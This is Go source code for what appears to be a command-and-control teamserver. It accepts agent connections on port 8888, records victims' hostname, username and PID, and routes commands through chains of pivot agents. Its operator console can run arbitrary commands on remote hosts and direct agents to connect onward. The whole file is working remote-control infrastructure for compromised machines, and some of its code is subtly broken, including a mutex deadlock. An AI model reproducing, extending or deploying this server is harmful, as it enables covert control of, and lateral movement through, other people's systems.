package main

import (
	"bufio"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

// --- 协议常量 ---
const (
	CMD_EXEC     = 0x01
	CMD_CONNECT  = 0x02
	CMD_FORWARD  = 0x03
	CMD_REGISTER = 0x04
	CMD_ACK      = 0x05
)

// --- Metadata 结构 ---
type AgentMetadata struct {
	AgentID   uint32 `json:"agent_id"` // 改为 uint32
	OS        string `json:"os"`
	Arch      string `json:"arch"`
	Hostname  string `json:"hostname"`
	Username  string `json:"username"`
	Process   string `json:"process"`
	PID       int    `json:"pid"`
	Timestamp int64  `json:"timestamp"`
}

type AgentInfo struct {
	Metadata AgentMetadata
	Active   bool
}

type Pivots struct {
	Parent *Agent
	Links  []*Agent
}

type Agent struct {
	AgentID uint32
	RouteID uint32
	Info    *AgentInfo
	Pivots  Pivots
	Conn    net.Conn
}

type Teamserver struct {
	Agents map[uint32]*Agent
	mu     sync.RWMutex
}

var ts = &Teamserver{
	Agents: make(map[uint32]*Agent),
}

// --- 协议工具 ---
func makePacket(cmdType byte, payload []byte) []byte {
	buf := make([]byte, 4+1+len(payload))
	binary.BigEndian.PutUint32(buf[0:4], uint32(1+len(payload)))
	buf[4] = cmdType
	copy(buf[5:], payload)
	return buf
}

func ReadPacket(conn net.Conn) (byte, []byte, error) {
	header := make([]byte, 4)
	if _, err := io.ReadFull(conn, header); err != nil {
		return 0, nil, err
	}
	length := binary.BigEndian.Uint32(header)
	if length > 10*1024*1024 {
		return 0, nil, fmt.Errorf("packet too large")
	}
	body := make([]byte, length)
	if _, err := io.ReadFull(conn, body); err != nil {
		return 0, nil, err
	}
	return body[0], body[1:], nil
}

// --- Agent 生命周期管理 ---

func (ts *Teamserver) RegisterAgent(conn net.Conn, metadata *AgentMetadata, isGateway bool) (*Agent, error) {
	ts.mu.Lock()
	defer ts.mu.Unlock()

	agentID := metadata.AgentID

	// 检查 ID 冲突
	if existing, ok := ts.Agents[agentID]; ok {
		if isGateway && existing.Conn != nil {
			existing.Conn.Close()
			ts.RemoveAgent(existing.AgentID)
		} else {
			return nil, fmt.Errorf("agent ID %d already exists", agentID)
		}
	}

	agent := &Agent{
		AgentID: agentID,
		RouteID: 0,
		Info: &AgentInfo{
			Metadata: *metadata,
			Active:   true,
		},
		Pivots: Pivots{Parent: nil, Links: make([]*Agent, 0)},
		Conn:   conn,
	}

	if !isGateway {
		agent.Conn = nil
	}

	ts.Agents[agentID] = agent

	if isGateway {
		fmt.Printf("\n[+] Gateway Online  | ID: %d | %s@%s | %s/%s\n> ",
			agentID, metadata.Username, metadata.Hostname, metadata.OS, metadata.Arch)
	}

	return agent, nil
}

func (ts *Teamserver) RegisterPivot(parentID uint32, routeID uint32, metadata *AgentMetadata) (*Agent, error) {
	ts.mu.Lock()
	defer ts.mu.Unlock()

	parent, ok := ts.Agents[parentID]
	if !ok {
		return nil, fmt.Errorf("parent %d not found", parentID)
	}

	agentID := metadata.AgentID

	if _, ok := ts.Agents[agentID]; ok {
		return nil, fmt.Errorf("pivot ID %d already exists", agentID)
	}

	agent := &Agent{
		AgentID: agentID,
		RouteID: routeID,
		Info: &AgentInfo{
			Metadata: *metadata,
			Active:   true,
		},
		Pivots: Pivots{Parent: parent, Links: make([]*Agent, 0)},
		Conn:   nil,
	}

	parent.Pivots.Links = append(parent.Pivots.Links, agent)
	ts.Agents[agentID] = agent

	fmt.Printf("\n[+] Pivot Online    | ID: %d | Parent: %d | RouteID: %d | %s@%s\n> ",
		agentID, parentID, routeID, metadata.Username, metadata.Hostname)
	return agent, nil
}

func (ts *Teamserver) RemoveAgent(agentID uint32) {
	ts.mu.Lock()
	defer ts.mu.Unlock()

	agent, ok := ts.Agents[agentID]
	if !ok {
		return
	}

	var removeRecursive func(*Agent)
	removeRecursive = func(a *Agent) {
		a.Info.Active = false
		for _, child := range a.Pivots.Links {
			removeRecursive(child)
		}
		delete(ts.Agents, a.AgentID)
	}

	removeRecursive(agent)

	if agent.Pivots.Parent != nil {
		parent := agent.Pivots.Parent
		newLinks := make([]*Agent, 0, len(parent.Pivots.Links))
		for _, child := range parent.Pivots.Links {
			if child.AgentID != agentID {
				newLinks = append(newLinks, child)
			}
		}
		parent.Pivots.Links = newLinks
	}
}

// --- 核心：路径计算与命令下发 ---

func (ts *Teamserver) GetPath(target *Agent) []*Agent {
	var path []*Agent
	curr := target
	for curr != nil {
		path = append(path, curr)
		curr = curr.Pivots.Parent
	}
	return path
}

func (ts *Teamserver) SendCommand(targetID uint32, cmdType byte, payload []byte) error {
	ts.mu.RLock()
	target, ok := ts.Agents[targetID]
	ts.mu.RUnlock()

	if !ok {
		return fmt.Errorf("agent %d not found", targetID)
	}

	path := ts.GetPath(target)
	if len(path) == 0 {
		return fmt.Errorf("invalid path")
	}

	packet := makePacket(cmdType, payload)

	for i := 1; i < len(path); i++ {
		nextHop := path[i-1]
		fwdPayload := make([]byte, 4+len(packet))
		binary.BigEndian.PutUint32(fwdPayload[0:4], nextHop.RouteID) // 4字节
		copy(fwdPayload[4:], packet)
		packet = makePacket(CMD_FORWARD, fwdPayload)
	}

	gateway := path[len(path)-1]
	if gateway.Conn == nil {
		return fmt.Errorf("gateway connection lost")
	}

	_, err := gateway.Conn.Write(packet)
	return err
}

// --- 网络通信处理 ---

func (ts *Teamserver) HandleAgent(gateway *Agent) {
	defer func() {
		gateway.Conn.Close()
		if gateway.AgentID != 0 {
			ts.RemoveAgent(gateway.AgentID)
			fmt.Printf("[-] Agent %d disconnected\n", gateway.AgentID)
		}
	}()

	cmdType, data, err := ReadPacket(gateway.Conn)
	if err != nil {
		return
	}

	if cmdType != CMD_REGISTER {
		fmt.Printf("[-] Invalid first packet from %s, expected REGISTER\n", gateway.Conn.RemoteAddr())
		return
	}

	var metadata AgentMetadata
	if err := json.Unmarshal(data, &metadata); err != nil {
		fmt.Printf("[-] Invalid metadata from %s: %v\n", gateway.Conn.RemoteAddr(), err)
		return
	}

	agent, err := ts.RegisterAgent(gateway.Conn, &metadata, true)
	if err != nil {
		fmt.Printf("[-] Register failed: %v\n", err)
		return
	}

	gateway.AgentID = agent.AgentID
	gateway.Info = agent.Info
	gateway.Pivots = agent.Pivots

	gateway.Conn.Write(makePacket(CMD_ACK, uint32ToBytes(agent.AgentID)))

	for {
		cmdType, data, err := ReadPacket(gateway.Conn)
		if err != nil {
			return
		}
		ts.processMessage(gateway.AgentID, cmdType, data)
	}
}

func (ts *Teamserver) processMessage(fromAgentID uint32, cmdType byte, data []byte) {
	switch cmdType {
	case CMD_EXEC:
		fmt.Printf("\n[Agent %d] Exec Result:\n%s\n", fromAgentID, string(data))

	case CMD_REGISTER:
		// 格式：[4字节 ParentID][4字节 RouteID][MetadataJSON]
		if len(data) < 8 {
			return
		}
		parentID := binary.BigEndian.Uint32(data[0:4]) // 4字节解析
		routeID := binary.BigEndian.Uint32(data[4:8])  // 4字节解析

		var metadata AgentMetadata
		if err := json.Unmarshal(data[8:], &metadata); err != nil {
			fmt.Printf("[-] Invalid pivot metadata: %v\n", err)
			return
		}

		if metadata.AgentID == parentID {
			return
		}

		newAgent, err := ts.RegisterPivot(parentID, routeID, &metadata)
		if err != nil {
			fmt.Printf("[-] Pivot register failed: %v\n", err)
			return
		}

		ts.SendCommand(newAgent.AgentID, CMD_ACK, uint32ToBytes(newAgent.AgentID))

	case CMD_FORWARD:
		if len(data) < 4 {
			return
		}
		routeID := binary.BigEndian.Uint32(data[0:4])
		innerData := data[4:]

		if len(innerData) < 5 {
			return
		}
		innerLen := binary.BigEndian.Uint32(innerData[0:4])
		innerType := innerData[4]
		innerBody := innerData[5 : 5+innerLen-1]

		// 处理 Pivot 的注册包 ===
		if innerType == CMD_REGISTER {
			var metadata AgentMetadata
			if err := json.Unmarshal(innerBody, &metadata); err != nil {
				fmt.Printf("[-] Invalid pivot metadata: %v\n", err)
				return
			}

			// fromAgentID 是父节点 (Agent1)，routeID 是子节点在父节点的标识
			newAgent, err := ts.RegisterPivot(fromAgentID, routeID, &metadata)
			if err != nil {
				fmt.Printf("[-] Pivot register failed: %v\n", err)
				return
			}

			// 下发 ACK 给新 Agent（通过转发链路）
			ts.SendCommand(newAgent.AgentID, CMD_ACK, uint32ToBytes(newAgent.AgentID))
			return // 注册完成，无需递归处理
		}

		// 普通数据转发：查找子节点并递归
		ts.mu.RLock()
		parentAgent := ts.Agents[fromAgentID]
		var actualSourceID uint32 = 0
		for _, child := range parentAgent.Pivots.Links {
			if child.RouteID == routeID {
				actualSourceID = child.AgentID
				break
			}
		}
		ts.mu.RUnlock()

		if actualSourceID == 0 {
			return
		}

		ts.processMessage(actualSourceID, innerType, innerBody)

	case CMD_CONNECT:
		fmt.Printf("\n[Agent %d] Connect Log: %s\n", fromAgentID, string(data))
	}
}

func uint32ToBytes(n uint32) []byte {
	b := make([]byte, 4) // 4字节
	binary.BigEndian.PutUint32(b, n)
	return b
}

func startListener(port string) {
	ln, err := net.Listen("tcp", ":"+port)
	if err != nil {
		panic(err)
	}
	fmt.Printf("[*] Server listening on 0.0.0.0:%s\n", port)

	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}

		go func(c net.Conn) {
			tempAgent := &Agent{Conn: c}
			ts.HandleAgent(tempAgent)
		}(conn)
	}
}

func runCLI() {
	scanner := bufio.NewScanner(os.Stdin)
	fmt.Print("> ")

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		parts := strings.Fields(line)
		if len(parts) == 0 {
			fmt.Print("> ")
			continue
		}

		switch parts[0] {
		case "list":
			ts.mu.RLock()
			fmt.Println("\n--- Topology Tree ---")
			fmt.Printf("%-12s %-12s %-12s %-15s %-20s\n", "GlobalID", "ParentID", "RouteID", "OS/Arch", "User@Host")
			fmt.Println(strings.Repeat("-", 75))

			for _, ag := range ts.Agents {
				if ag.Pivots.Parent == nil {
					printTree(ag, 0)
				}
			}
			ts.mu.RUnlock()

		case "info":
			if len(parts) < 2 {
				fmt.Println("Usage: info <agent_id>")
				break
			}
			// 解析为 uint32
			id64, _ := strconv.ParseUint(parts[1], 10, 32)
			id := uint32(id64)

			ts.mu.RLock()
			if ag, ok := ts.Agents[id]; ok {
				meta := ag.Info.Metadata
				fmt.Printf("\n--- Agent %d Info ---\n", id)
				fmt.Printf("OS:       %s\n", meta.OS)
				fmt.Printf("Arch:     %s\n", meta.Arch)
				fmt.Printf("Hostname: %s\n", meta.Hostname)
				fmt.Printf("Username: %s\n", meta.Username)
				fmt.Printf("Process:  %s (PID: %d)\n", meta.Process, meta.PID)
				fmt.Printf("Uptime:   %s\n", time.Since(time.Unix(meta.Timestamp, 0)))
			} else {
				fmt.Printf("Agent %d not found\n", id)
			}
			ts.mu.RUnlock()

		case "exec":
			if len(parts) < 3 {
				fmt.Println("Usage: exec <agent_id> <command>")
				break
			}
			id64, _ := strconv.ParseUint(parts[1], 10, 32)
			id := uint32(id64)
			cmd := strings.Join(parts[2:], " ")
			if err := ts.SendCommand(id, CMD_EXEC, []byte(cmd)); err != nil {
				fmt.Printf("[-] Error: %v\n", err)
			}

		case "connect":
			if len(parts) < 3 {
				fmt.Println("Usage: connect <agent_id> <target_addr:port>")
				break
			}
			id64, _ := strconv.ParseUint(parts[1], 10, 32)
			id := uint32(id64)
			target := parts[2]
			if err := ts.SendCommand(id, CMD_CONNECT, []byte(target)); err != nil {
				fmt.Printf("[-] Error: %v\n", err)
			}
		}
		fmt.Print("> ")
	}
}

func printTree(agent *Agent, depth int) {
	prefix := strings.Repeat("  ", depth)
	parentID := uint32(0)
	if agent.Pivots.Parent != nil {
		parentID = agent.Pivots.Parent.AgentID
	}
	meta := agent.Info.Metadata
	osArch := fmt.Sprintf("%s/%s", meta.OS, meta.Arch)
	userHost := fmt.Sprintf("%s@%s", meta.Username, meta.Hostname)

	fmt.Printf("%s%-12d %-12d %-12d %-15s %-20s\n",
		prefix, agent.AgentID, parentID, agent.RouteID, osArch, userHost)

	for _, child := range agent.Pivots.Links {
		printTree(child, depth+1)
	}
}

func main() {
	rand.Seed(time.Now().UnixNano())
	go startListener("8888")
	time.Sleep(200 * time.Millisecond)
	runCLI()
}
